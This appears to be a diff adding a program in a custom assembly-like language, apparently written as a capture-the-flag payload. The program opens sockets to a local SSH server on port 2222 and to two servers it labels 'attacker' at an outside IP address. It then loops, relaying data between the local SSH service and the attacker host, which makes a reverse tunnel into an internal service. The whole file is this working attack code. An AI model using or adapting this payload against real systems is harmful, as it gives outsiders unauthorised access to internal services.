@@ -1,0 +1,134 @@
+ip: ipstart
+
+const0: 0
+const4: 4
+
+sys_sendto:	44
+sys_recvfrom:	45
+sys_socket:	41
+sys_connect:	42
+
+
+tempres: 0
+
+//socket
+
+//AF_INET, SOCK_STREAM, 0
+socket_data: 2 1 0
+
+
+//connect
+
+//lets make the addr
+//struct sockaddr_in {
+//    short            sin_family;   // e.g. AF_INET
+//    unsigned short   sin_port;     // e.g. htons(3490)
+//    struct in_addr   sin_addr;     // see struct in_addr, below
+//    char             sin_zero[8];  // zero this if you want to
+//};
+
+
+//this is the target ssh server
+//sockaddr_data:	0xb3150002		//port:AF_INET	// port 5555
+sockaddr_data:	0xae080002		//port:AF_INET	// port 2222
+		0x0100007f		//addr in fuckyou form
+		0x00			//zeros or not
+		0x00
+
+
+//attacker gender bender server
+sockaddr2_data:	0xb4150002		//port:AF_INET	//port 5556
+		0xf9b08e49		//addr in fuckyou form
+		0x00			//zeros or not
+		0x00
+
+//attacker pusher server
+sockaddrpusher_data:	0xb5150002	//port:AF_INET	//port 5557
+		0xf9b08e49		//addr in fuckyou form
+		0x00			//zeros or not
+		0x00
+
+
+		// sockfd, &sockaddr, sizeof(sockaddr))
+connect_data: sock_res: 0 sockaddr_data 16
+connect2_data: sock2_res: 0 sockaddr2_data 16
+connectpusher_data: sockpusher_res: 0 sockaddrpusher_data 16
+
+//recvfroms
+	// sockfd, buffer, size, MSG_DONTWAIT, null, null
+recv_data:
+sock_rec_res: 0 boof 256 0x40 0 0
+
+	// sockfd, buffer, size, MSG_DONTWAIT, null, null
+recv2_data:
+sock2_rec_res: 0 boof 256 0x40 0 0
+
+
+	// sockfd, buffer, size, MSG_WAITALL, null, null
+recvpusher_data:
+sockpusher_rec_res: 0 boof 1 0x100 0 0
+
+//sendtoos
+send_data:
+sock_send_res: 0 boof sendsize: 0, 0x0, 0, 0
+
+send2_data:
+sock2_send_res: 0 boof send2size: 0, 0x0, 0, 0
+
+loopaddr: loop
+
+ipstart:
+//grab two sockets
+0x133769 sys_socket socket_data sock_res
+0x133769 sys_connect connect_data tempres
+
+0x133769 sys_socket socket_data sock2_res
+0x133769 sys_connect connect2_data tempres
+
+//grab pusher socker
+
+0x133769 sys_socket socket_data sockpusher_res
+0x133769 sys_connect connectpusher_data tempres
+
+//copy the sockets to the recv and senddata
+add const0 sock_res sock_rec_res
+add const0 sock_res sock_send_res
+
+add const0 sock2_res sock2_rec_res
+add const0 sock2_res sock2_send_res
+
+//copy pusher socker to recv
+add const0 sockpusher_res sockpusher_rec_res
+
+loop:
+	0x133769 sys_recvfrom recvpusher_data tempres	//i dont care about return size
+
+
+	0x133769 sys_recvfrom recv_data send2size
+
+	//i really should be resting 0>= send2size, but 0> worked out in practice so why make it more complex
+
+	tg const0 send2size tempres	//lets test to see if we recv'd anything
+	mult tempres const4 tempres	//gonna jump one instr if 0 > send2size
+	add ip tempres ip
+		0x133769 sys_sendto send2_data tempres
+
+
+	0x133769 sys_recvfrom recv2_data sendsize
+
+	tg const0 sendsize tempres	//lets test to see if we recv'd anything
+	mult tempres const4 tempres	//gonna jump one instr if 0 > sendsize
+	add ip tempres ip
+		0x133769 sys_sendto send_data tempres
+	
+
+sub loopaddr const4 ip	//jump to loop
+
+
+
+boof: 
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0	//256 bytes of buffer (or more!)
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
+
